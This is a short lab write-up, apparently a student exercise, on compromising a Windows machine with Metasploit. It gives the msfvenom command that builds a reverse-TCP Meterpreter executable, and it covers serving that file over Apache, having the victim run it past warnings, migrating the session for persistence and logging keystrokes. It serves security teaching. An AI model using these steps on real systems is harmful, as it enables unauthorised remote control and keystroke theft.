# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
# OUTPUT
![Screenshot 2025-03-28 135513](https://github.com/user-attachments/assets/2e026f51-cd2b-4b9f-8dea-ff7f4547fce1)

Create a malicious executable file test.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.128 LPORT=4433 -f exe -o test.exe
# OUTPUT
![Screenshot 2025-03-28 135743](https://github.com/user-attachments/assets/2d436f21-89b7-4bb1-b630-1cedadbda223)

Move the fun.exe into the apache /var/www/html folder
# OUTPUT
![Screenshot 2025-03-28 135850](https://github.com/user-attachments/assets/59be41ae-3e57-410c-aa17-6a8e8d431e63)

Start apache server sudo systemctl apache2 start
# OUTPUT
![Screenshot 2025-03-28 140117](https://github.com/user-attachments/assets/456d0ecc-334d-49cd-a18c-b1b6cd9c493e)

Check the status of apache2
# OUTPUT
![Screenshot 2025-03-28 140255](https://github.com/user-attachments/assets/add1a3dc-55c1-4879-b6ec-0320b1e36875)

Invoke msfconsole:
# OUTPUT
![Screenshot 2025-03-28 132126](https://github.com/user-attachments/assets/5a89d7e7-8fb8-4983-a001-0bcd4517ab4a)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler
# OUTPUT
![image](https://github.com/user-attachments/assets/b7439fff-0290-4bbd-8cf8-aeae1fadf767)

set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.85.128/test.exe The file "test.exe" downloads.
# OUTPUT
![Screenshot 2025-03-28 142806](https://github.com/user-attachments/assets/dec77e68-1d3d-4503-b47e-e40641f2a957)

Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
# OUTPUT
![image](https://github.com/user-attachments/assets/fd5589b8-2c79-45e0-8be4-34e127f73577)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the test.exe process running with pid 1156
# OUTPUT
![Screenshot 2025-03-28 143948](https://github.com/user-attachments/assets/5881e91d-5fad-42a6-b2bd-849f9065012b)
![image](https://github.com/user-attachments/assets/f77ca603-b0dd-436b-9eed-51793497e10e)

The Metasploit shell is running inside the "test.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:
migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
# OUTPUT
![Screenshot 2025-03-28 144022](https://github.com/user-attachments/assets/fcbe5432-753f-451b-9ef2-1b3f6b2f84c8)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
# OUTPUT
![image](https://github.com/user-attachments/assets/29c656cd-4f7f-4b8e-84a3-707d6ba7e3d2)
![Screenshot 2025-04-07 113052](https://github.com/user-attachments/assets/512d8015-e6df-443d-866b-5bdebb5f3949)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
